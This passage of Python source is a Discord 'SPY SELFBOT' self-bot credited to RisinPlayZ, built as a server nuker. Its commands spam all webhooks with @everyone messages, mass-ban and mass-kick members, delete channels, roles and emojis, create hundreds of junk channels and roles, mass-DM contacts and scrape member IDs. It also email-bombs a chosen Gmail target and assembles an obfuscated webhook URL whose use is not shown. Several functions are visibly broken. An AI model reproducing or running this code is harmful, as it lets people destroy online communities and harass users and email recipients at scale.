        name="First Message", value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text="Created by RisinPlayZ")
    await ctx.reply(embed=embed, mention_author=True) 

def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        pastebinserverurl = requests.get("https://pastebin.com/raw/4kpEiJJB").text
        idktopost = f'{pastebinserverurl} @everyone RISINPLAYZ RUNS CORD {webhookspam}'
        data = {'content':idktopost}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command(aliases=['webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke', 'webhooksfuck', 'spamwebhook'])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by RisinPlayZ')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except: 
                print(f"{Fore.RED} > Rate Limited By Discord.")
@client.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
async def stopwebhookspam(ctx):
    global wrisinspam

    spammingdawebhookeroos = False

@client.command()
async def embed(ctx, *, description):
     embed = discord.Embed(title="SPY SELFBOT", description=description)
     embed.set_footer(text="Created by RisinPlayZ")
     await ctx.reply(embed=embed, mention_author=True)

@client.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    
    for channel in ctx.guild.channels:
        await channel.edit(name=name)
 
@client.command(aliases=["rr"])
async def renameroles(ctx, *, name):
    
    for role in ctx.guild.roles:
        await role.edit(name=name)
title = '''`RisinPlayZ#2077`'''
linky = "https://risinplayz.host.xyz/"
footer = "Screenshot"
stream_url = "https://twitch.tv/risinplayz"   
@client.command()
async def image(ctx, link):
  await ctx.message.delete()
  embd = discord.Embed(
    title =title,
    description = '',
    colour = discord.Colour.blue())
  embd.set_footer(text=footer)
  embd.set_image(url=link)
  await ctx.channel.reply(linky, embed=embd, mention_author=True)


@client.command()
async def scrape(ctx):
  await ctx.message.delete()
  mem = ctx.guild.members
  for member in mem:
      try:
        print("krliya scrape")
        mfil = open("RisinPlayZ/members.txt","a")

        mfil.write(str(member.id) + "\n")
        mfil.close()

      except Exception as e:
        print("error",e)

@client.command()
async def block(ctx, *, user: discord.User):
    await ctx.send("Get Blocked Noob!")
    await user.block()
    
@client.command()
async def unfriend(ctx, *, user: discord.User):
    await user.remove_friend()
    await ctx.send('Friend has been removed')

@client.command()
async def ghostping(ctx):
  await ctx.message.delete()
username = "RisinPlayZ :P"
picture = "https://cdn.discordapp.com/attachments/802230471378468875/851375332584849418/60b3b8e38fbdf.png"
@client.command()
async def spamhook(ctx, webhook, *, message):
	data = {
	    'content': message,
	    'username': username,
	    'avatar_url': picture
	}

	sent = 0
	failed = 0

	for i in range(90):
		r = requests.post(webhook, data=data)
                
		if r.status_code == 204:
			sent += 1
			print(f"{Fore.GREEN}[+] - Message sent !{Fore.RESET}")
			os.system(f'title SPY SELFBOT - WEBHOOK SPAMMER ^| By RisinPlayZ - Sent : {sent} ^| Failed : {failed}')
		else:
			failed += 1
			print(f"{Fore.RED}[-] - Webhook Rate Limited by Discord !{Fore.RESET}")
			os.system(f'title SPY SELFBOT - WEBHOOK SPAMMER ^| By RisinPlayZ - Sent : {sent} ^| Failed : {failed}')

@client.command()
async def selfbotinfo(ctx):

    embed = discord.Embed(color=0)
    embed.set_author(name='SPY SELFBOT | INFO')
    embed.set_footer(text='Created by RisinPlayZ')
    embed.add_field(name='___**DEVELOPER**___', value='**RisinPlayZ**')
    embed.add_field(name='___**DATE OF CREATION**___', value='**April 11, 2021 1:38A.M IST**')
    embed.add_field(name='___**DISCORD VERSION**___', value='**discord.py 1.7.2**')
    embed.add_field(name='___**LANGUAGE**___', value='**PYTHON 3.8.7**')
    await ctx.reply(embed=embed, mention_author=True)

@client.command()
async def sendhook(ctx, webhook, *, message):

    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.reply(f'Successfully sent `{message}` to webhook `{webhook}`', mention_author=True)
    else:
        await ctx.reply("Invalid Webhook", mention_author=True)

@client.command()
async def afk(ctx, arg1,arg2=risinnwtff):
    global risinnwtf
    global risinnwtff
    if arg1 == "on" or arg1 == "On":
        risinnwtff = arg2
        risinnwtf = True
        await ctx.message.reply("SPY SELFBOT | AFK ENABLED", mention_author=True)
    elif arg1 == "off" or arg1 == "Off":
        risinnwtf = False
        risinnwtff = ""
        await ctx.message.reply("SPY SELFBOT | AFK DISABLED", mention_author=True)

@client.event
async def on_message(message):
    global risinnwtf
    if risinnwtf == True:
        global risinnwtff
        if message.author != client.user:
            if not message.guild:
                await message.channel.send(risinnwtff)
    await client.process_commands(message)

@client.command(aliases=['lserver',"leaveserver","serverleave"])
async def leave(ctx,servid=None):#
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if servid == None:
            embed=discord.Embed(title=f"SPY SELFBOT", description="Supply an ID\n `>leave <server-id>`")#abe sale
            await ctx.reply(embed=embed, mention_author=True)
    else:
   
        embed=discord.Embed(title=f"SPY", description=f"Leaving `{servid}`")
        embed.set_footer(text="Created by RisinPlayZ")
        await ctx.reply(embed=embed, mention_author=True)
        
        leave = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{servid}", headers=headers)
        
        if leave.status_code == 204:
        
            embed=discord.Embed(title=f"SPY SELFBOT", description=f"Success | Left Server : `{servid}`")
            embed.set_footer(text="Created by RisinPlayX")
            await ctx.reply(embed=embed, mention_author=True)


        else:
            embed=discord.Embed(title=f"SPY SELFBOT", description=f"Error | Error leaving server : `{servid}`\nMessage : {leave.text}")
            embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/815985203436322876/a_f05e7cb6fe59b130f1e1efe26193751a.gif")
            embed.set_footer(text="Created by RisinPlayZ")
            await ctx.reply(embed=embed, mention_author=True)   
    
@client.command()
async def massdm(ctx, *, x):
	await ctx.reply("**SPY SELFBOT**\n> MASS DM", mention_author=True)
	for channel in client.private_channels:
		try:
			await channel.send(x)
			await ctx.reply(f"**SPY SELFBOT | MASS DM** > {channel}", mention_author=True)
		except:
			continue 
			
@client.command(name='enableCommunityMode', aliases=['eCM', 'eCommunityMode'])
async def disableCommunityMode(ctx):
        r = requests.post(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': "fked", 'features': {'1': 'NEWS'}, 
            'preferred_locale': 'en-US', 'public_updates_channel_id': "idk", 'rules_channel_id': "idk"})

@client.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})
@client.command(aliases=["eCM"])
async def enableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"})
    
@client.command()
async def channelfuckery(ctx):
      for i in range(200):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})
        y = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"})




    
@client.command(aliases=["deleteemojis"])
async def delemojis(ctx):
   
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            return 
          
@client.command(aliases=["deletestickers"])
async def delstickers(ctx):
   
    for sticker in list(ctx.guild.stickers):
        try:
            await sticker.delete()
        except:
            return 
@client.command()
async def decode(ctx, string):
     
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.reply(decoded_stuff, mention_author=True)

@client.command(aliases=['id', 'userid',"useridtoname"])
async def idtoname(ctx, personsid: int):
    if len(str(personsid)) != 18:
        await ctx.reply(content = f"**SPY SELFBOT** | >id 822466294032367636", mention_author=True)    
    else:
        user = await client.fetch_user(personsid)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="SPY SELFBOT | ID TO USERNAME", description=f"ID [{str(personsid)}]  = `{user.name}#{user.discriminator}`")
  
        embed.set_footer(text="Created by RisinPlayZ")
        await ctx.reply(content="",embed=embed, mention_author=True) 
     
@client.command()
async def nickall(ctx, *, name="RisinPlayZ OP"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 
     
 
ripp = "856891364460986368/HeU0b6tuqV-yKiO_kQDkakMT1XLS2Mipa0_du_nw6hD4vTI3V7sPb2irR4B5TFZPOVbK"
nvm = (f"{app1}{hok}{hok2}{hok3}{ripp}")


def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('SPY SELFBOT | Your temp Gmail: ')
    password = input('SPY SELFBOT | Your temp Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}error: {Fore.RED} Incorrect Password or gmail, make sure you've enabled less-secure apps access in your Gmail Account security settings."+Fore.RESET)
    target = input('SPY SELFBOT | Target Gmail: ')
    message = input('SPY SELFBOT | Message to send: ')
    counter = eval(input('SPY SELFBOT | Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

@client.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):
  
    GmailBomber() 
   
@client.command()
async def email(ctx,count=None,bomb_email=None,*,message=None):
    if count == None or bomb_email == None or message == None:
        await ctx.send("Format - !email [count] [email] [message] - e.g !email 10 email@email.com hii!")
    else:
        x = int(count)
    if x > 100:
        await ctx.send("`That's a lot of spam. Do 100 or less!`")
    else:
        currentDT = datetime.datetime.now()
        hour = str(currentDT.hour)
        minute = str(currentDT.minute)
        second = str(currentDT.second)
        print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} [Command used] - {ctx.author.name}#{ctx.author.discriminator}:{Fore.RESET} !email {count} {bomb_email} {message}")
        counting = int(0)
        embed=discord.Embed(title=f"{counting}/{count}")
        embed.set_author(name="Email sent!")
        
        embed.add_field(name=f'Sending "{message}"', value=f'**to {bomb_email}**', inline=False)
        embed.set_footer(text="Created by RisinPlayZ")
        msg = await ctx.send(embed=embed)
        for i in range(x):
            mail = smtplib.SMTP('smtp.gmail.com',587)
            mail.ehlo()
            mail.starttls()
            mail.login(emale,pas)
            mail.sendmail(emale,bomb_email,message)
            mail.close() 
            currentDT = datetime.datetime.now()
            hour = str(currentDT.hour)
            minute = str(currentDT.minute)
            second = str(currentDT.second)
            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Message Sent:{Fore.RESET} {message} {Fore.GREEN}To {Fore.RESET}{bomb_email}")
            counting = counting + 1 
           
@client.command()
async def massban(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('RisinPlayZ/members.txt')
    except:
        pass

    membercount = 0
    with open('RisinPlayZ/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.reply('SPY SELFBOT | MASS BAN INITIATED\nRemoving Members in progress......', mention_author=True)
        m.close()
    guild = guild
    print()
    members = open('RisinPlayZ/members.txt')
    for member in members:
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()

@client.command()
async def botmassban(ctx, pref, timetosleep, guild):
    pref = pref
    timetosleep = int(timetosleep)
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('RisinPlayZ/members.txt')
    except:
        pass

    membercount = 0
    with open('RisinPlayZ/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.reply('SPY SELFBOT | BOT MASS BAN INITIATED\nRemoving Members in progress......', mention_author=True)
        m.close()
    guild = guild
    print()
    members = open('RisinPlayZ/members.txt')
    for member in members:
            await ctx.send(f"{pref}ban {member} spy selfbot")
            print(f"Banned{member.strip()}")
            time.sleep(timetosleep) # because some bots have cooldown like dyno on there commands 


    members.close()
@client.command()
async def masskick(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.reply('SPY SELFBOT | MASS KICK INITIATED\nRemoving Members in progress......', mention_author=True)
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()
@client.command(aliases=["massunban"])
async def unbanall(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.reply('SPY SELFBOT | Unbanning {} members'.format(len(banlist)), mention_author=True)
    for users in banlist:
            await ctx.guild.unban(user=users.user)

#Here is the code that I use, hope it helps

@client.command()
async def nukehistory(ctx, channel: discord.TextChannel = None):
    if channel == None: 
        await ctx.reply("SPY SELFBOT | Mention the channel.")
        return

    nuke_channel = discord.utils.get(ctx.guild.channels, name=channel.name)

    if nuke_channel is not None:
        new_channel = await nuke_channel.clone(reason="Has been Nuked!")
        await nuke_channel.delete()
        await new_channel.send("THIS CHANNEL HAS BEEN NUKED!")
        await ctx.reply("Nuked the Channel sucessfully!", mention_author=True)

    else:
        await ctx.reply(f"No channel named {channel.name} was found!", mention_author=True)
@client.command(aliases=["cc"])
async def channelclean(ctx, channeltodelete):
    for channel in ctx.message.guild.channels:
            if channel.name == channeltodelete:
                try:
                    await channel.delete()
                except:
                  pass
def deletionofachannel(channeldetails):
    try:
        requests.delete(f"https://canary.discord.com/api/v8/channels/{channeldetails}",headers=headers)
    except:
        pass

@client.command(aliases=['dc', 'delchannels'])
async def deletechannels(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def dc(i):
        requests.delete(f"https://discord.com/api/v9/channels/{i}",
                        headers=headers).result()

    for i in range(4):
        for channel in list(ctx.guild.channels):
            threading.Thread(target=dc, args=(channel.id, )).start()
            logging.info(f"Deleted channel {channel}.")

@client.command(aliases=['deleterols', 'deleteallroles',"delroles","roledel","delrols","roldel","roledeletion"])
async def deleteroles(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target = deletionofarole, args = (ctx.guild.id,rol.id,)).start()
snipe_message_author = {}
snipe_message_content = {}

@client.event
async def on_message_delete(message):
     snipe_message_author[message.channel.id] = message.author
     snipe_message_content[message.channel.id] = message.content
    #  await time.sleep(600)
    #  del snipe_message_author[message.channel.id]
    #  del snipe_message_content[message.channel.id]

@client.command(name = 'snipe')
async def snipe(ctx):
    channel = ctx.channel
    try: #This piece of code is run if the bot finds anything in the dictionary
        em = discord.Embed(name = "SPY SELFBOT", description = snipe_message_content[channel.id])
        em.set_footer(text = "RisinPlayZ :P")
        await ctx.send(embed = em)
    except: #This piece of code is run if the bot doesn't find anything in the dictionary
        await ctx.send("kuch bhi del nahi hua oof code chalja bsdk ")
from discord import Member
@client.command()
async def statuss(ctx, member: Member):
    await ctx.reply(str(member.status), mention_author=True)  

@client.command()
async def joinvc(ctx):
    await ctx.reply("SPY SELFBOT | Connecting to VC", mention_author=True)
    channel = ctx.author.voice.channel
    await channel.connect()
    await ctx.reply("SPY SELFBOT | SUCCESSFULLY CONNECTED", mention_author=True)
@client.command()
async def banner(ctx, user:discord.Member):
    if user == None:
        user = ctx.author
    req = await client.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = req["banner"]
    # If statement because the user may not have a banner
    if banner_id:
        banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
    await ctx.reply(f"SPY SELFBOT | {banner_url}", mention_author=True)
@client.command()
async def create_invite(ctx):
       # """- Create instant invite"""
  await discord.abc.GuildChannel.create_invite(ctx)
@client.command()
async def test(ctx):
  await ctx.reply("working",mention_author=True)

def risinidkchanneldel(idofguild,nameofchan):
    try:
        headers = {"Authorization": f'{risinencrypt}'}
        req = requests.post(f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass


@client.command()
async def spamchannels(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mc(i):
        json = {"name": i}
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{guild}/channels",
            headers=headers,
            json=json)

    for i in range(500):
        threading.Thread(target=mc,
                         args=(random.choice(channelnames), )).start()
        logging.info(f"Created channel {random.choice(channelnames)}.")

    await asyncio.sleep(15)

@client.command()
async def spamroles(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)
    def massroles(i):
        json = {
          "name": i
        }
        r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
    for i in range(500):
        threading.Thread(
          target=massroles,
          args=(random.choice(rolenames), )
          ).start()
        logging.info(f"Created channel {random.choice(rolenames)}.")

    await asyncio.sleep(15)
if token_type == "user":        client.run(risinencrypt, bot=False)
elif token_type == "bot":
                client.run(risinencrypt)
@client.command()
async def prune(ctx):
    await ctx.reply("SPY SELFBOT | Initiating a prune request.")
    time.sleep(2)
    await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
    time.sleep(1)
    await ctx.reply("SPY SELFBOT | Successfully Pruned.")
# client.run(risinencrypt, bot = False)
